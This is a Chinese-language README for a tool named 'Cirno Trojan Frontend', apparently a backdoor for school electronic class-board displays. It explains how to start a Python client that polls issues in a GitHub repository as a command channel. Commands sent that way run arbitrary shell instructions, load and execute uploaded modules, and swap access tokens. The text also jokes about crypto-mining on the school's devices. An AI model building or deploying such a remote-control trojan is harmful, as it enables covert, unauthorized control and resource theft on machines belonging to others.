# Cirno Trojan Frontend
你校电子班牌迫真后台，巨大多屎山，，，

`Remove GS, Macrohard strong!`

高雅后台，挖矿开服行为艺术开学校大型 impart 必备

# 使用
## 调用
```python
from main import GitMan, Control
git = GitMan()
control = Control(git, interval=64)  # interval 控制拉取更新的时间
control.start()
```
## 远程指令
在 [这个地方](https://github.com/myhsp/CirTrojanBackend/issues) 的任意最新 issue 里面发送消息。
### 加载配置
```
load_config
<module 1> <dependency 1>; <dependency 2>; ...
<module 2> <dependency 1>; <dependency 2>; ...
```
### 运行 shell 指令
直接输入
### 运行 Control 类 内部指令
输入
```
internal
<internal method name>[ <param 1>, <param 2>, ...]
<internal method name>[ <param 1>, <param 2>, ...]
```
注：要查看内部指令列表，使用
```
internal
get_all_methods_rendered
```
### 手动加载模块
需要先将模块文件上传到先前的 backend 的根目录。
```
load_module
<module name>
```
模块名称不要包含 .py

注意，模块必须包含一个 `run(*arg)` 函数。
### 手动执行模块
```
run_module
<module 1> <param 1>; <param 2>; ...
```
### 更新 token
```
internal
update_token <token> <repo link(e.g. myhsp/CirTrojanBackend)> <expires>
```
